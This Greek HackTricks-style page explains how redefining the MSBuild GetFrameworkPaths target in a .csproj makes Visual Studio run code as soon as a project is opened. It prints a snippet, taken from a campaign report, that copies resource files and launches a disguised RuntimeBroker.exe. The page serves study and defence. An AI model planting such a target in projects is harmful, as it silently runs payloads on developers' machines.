# Εκτέλεση MSBuild κατά τη φόρτωση έργου στο Visual Studio

{{#include ../banners/hacktricks-training.md}}

Το άνοιγμα ενός έργου C# στο Visual Studio δεν είναι απλή ανάγνωση. Η build κατά τη φόρτωση του έργου καλεί συγκεκριμένα targets του MSBuild για να αρχικοποιήσει το IntelliSense, τις αναφορές και τον εντοπισμό σφαλμάτων **πριν** ο προγραμματιστής επιλέξει Build ή Run. Το `GetFrameworkPaths` είναι ένα από αυτά τα targets. Ένα έργο που το επαναορίζει μπορεί να εκτελέσει κώδικα στο πλαίσιο του χρήστη κατά τη φόρτωση του έργου, χωρίς να απαιτείται ξεχωριστό κλικ σε payload.<sup>[[1]](#references)[[2]](#references)</sup>

Το έργο που αναφέρθηκε δήλωνε αρχεία πόρων και στη συνέχεια χρησιμοποιούσε τα `MakeDir`, `Copy` και `Exec` μέσα στο target που είχε αντικαταστήσει, για να προετοιμάσει και να εκκινήσει ένα payload που βρισκόταν στον ίδιο κατάλογο. Αυτό το συντομευμένο απόσπασμα διατηρεί τη διαδρομή εκτέλεσης που παρουσιάζεται στο Figure 6 της πηγής· πρέπει να βρίσκεται μέσα σε ένα `.csproj`, όχι σε ένα αυτόνομο αρχείο XML.<sup>[[1]](#references)</sup>

```xml
<ItemGroup>
  <ResourceFiles Include="Resources\**\*.*" />
</ItemGroup>
<Target Name="GetFrameworkPaths">
  <MakeDir Directories="$(LocalAppData)\Microsoft\RuntimeBrokers" />
  <Copy SourceFiles="@(ResourceFiles)"
        DestinationFolder="$(LocalAppData)\Microsoft\RuntimeBrokers\%(RecursiveDir)"
        SkipUnchangedFiles="true" />
  <Exec Command='start "" "$(LocalAppData)\Microsoft\RuntimeBrokers\RuntimeBroker.exe"' />
</Target>
```

**Η σειρά των import έχει σημασία:** Το MSBuild χρησιμοποιεί τον *τελευταίο* ορισμό ενός target. Δεν είναι εγγυημένο ότι ένα target γραμμένο σε αρχείο project θα αντικαταστήσει το target της Microsoft, αν ένα μεταγενέστερο import τον επαναορίσει. Τα project τύπου SDK που χρησιμοποιούν `<Project Sdk="...">` εισάγουν έμμεσα τα targets του SDK μετά το σώμα του project, επομένως ελέγξτε τη σειρά των αξιολογημένων imports αντί να υποθέσετε ότι αυτή η ακριβής παράκαμψη λειτουργεί σε κάθε project. Η εντολή `MSBuild.exe -preprocess:expanded.xml project.csproj` επεκτείνει τα imports χωρίς να κάνει build το project και μπορεί να βοηθήσει στον εντοπισμό του ενεργού ορισμού του target.<sup>[[3]](#references)[[4]](#references)</sup>

Αυτή είναι μια επιφάνεια εκτέλεσης project ανάπτυξης, όχι εγκατάσταση επέκτασης VSIX, και από μόνη της δεν αποτελεί privilege escalation. Αν το staged εκτελέσιμο χρησιμοποιεί ένα κακόβουλο παρακείμενο `.exe.config` ή DLL, συνεχίστε με το [AppDomainManager hijacking and DLL sideloading](windows-local-privilege-escalation/dll-hijacking/).

## References

- [1] [Unit 42 - Η καμπάνια Blinder Tunnel στοχεύει ιρακινές υποδομές](https://unit42.paloaltonetworks.com/blinder-tunnel-targets-critical-infrastructure/)
- [2] [Microsoft Learn - Ενσωμάτωση Visual Studio (MSBuild)](https://learn.microsoft.com/en-us/visualstudio/msbuild/visual-studio-integration-msbuild?view=visualstudio)
- [3] [Microsoft Learn - Targets του MSBuild](https://learn.microsoft.com/en-us/visualstudio/msbuild/msbuild-targets)
- [4] [Microsoft Learn - Αναφορά γραμμής εντολών MSBuild](https://learn.microsoft.com/en-us/visualstudio/msbuild/msbuild-command-line-reference?view=visualstudio)
{{#include ../banners/hacktricks-training.md}}
